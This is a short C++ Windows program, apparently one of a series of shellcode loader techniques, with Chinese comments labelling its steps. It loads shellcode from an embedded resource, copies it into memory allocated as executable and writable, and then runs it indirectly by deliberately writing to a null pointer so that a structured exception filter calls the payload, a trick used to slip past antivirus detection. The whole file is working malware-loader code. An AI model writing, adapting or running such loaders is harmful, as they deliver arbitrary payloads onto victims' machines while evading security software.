#include"..\public.hpp"

LPVOID Memory;
int ExceptFilter()
{
	((void(*)())Memory)();
	return EXCEPTION_CONTINUE_EXECUTION;
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//1.获取shellcode
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.分配shellcode空间
	Memory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode, shellcodeSize);
	//3.执行shellcode
	int* p = 0x00000000;
	_try
	{
		*p = 13;
	}
		_except(ExceptFilter())
	{
	};
	return 0;
}